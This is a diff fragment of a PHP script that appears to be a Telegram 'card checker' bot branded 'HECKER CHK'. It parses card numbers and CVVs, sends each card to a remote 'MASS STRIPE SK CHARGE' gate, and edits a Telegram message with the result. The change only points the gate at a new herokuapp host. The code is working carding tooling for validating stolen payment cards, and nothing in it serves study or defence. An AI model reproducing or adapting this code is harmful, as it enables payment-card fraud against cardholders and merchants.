@@ -48,7 +48,7 @@ $cvvz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[3];
     $sent = json_decode(file_get_contents($sendmes) ,1);
       $mes_id = $sent['result']['message_id'];
   
-  $r1 = file_get_contents('http://20.212.107.64/skbasedchk/gate/usd0.5.php?lista='.$lista1.'');
+  $r1 = file_get_contents('https://smk.herokuapp.com/modules/mch.php?lista='.$lista1.'');
   $msg1 = trim(strip_tags(getStr($r1,' <br>Result:','</span><br>')));
   $ccr1 = "━━━━━━━━━━━━━%0A[ϟ] GATE: MASS STRIPE SK CHARGE %0A%0A[ϟ] 1st CC: <code>$lista1</code>%0A[ϟ] 1st CC RESULT: $msg1%0A━━━━━━━━━━━━━";
   editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1</b>",$mes_id);
